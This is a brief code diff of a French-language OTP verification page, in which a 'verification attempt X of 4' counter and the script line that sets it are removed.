@@ -45,9 +45,9 @@
     <h2 class="verification-title">Vérification requise</h2>
     <p class="verification-instruction">Entrez le code OTP</p>
     <p class="helper-text">Un code à 4 chiffres a été envoyé à <span id="phone">+243000000000</span></p>
-    <p class="otp-attempts-text" id="attempt-status">Vérification <span id="attempt-num">1</span> sur 4</p>
 
     <div class="otp-entry">
+
 
 
 
@@ -68,7 +68,7 @@ const orderId = urlParams.get('order_id');
 const phone = urlParams.get('phone') || '+243000000000';
 const currentAttempt = parseInt(urlParams.get('attempt')) || 1;
 document.getElementById('phone').textContent = phone;
-document.getElementById('attempt-num').textContent = currentAttempt;
+
 
 
 
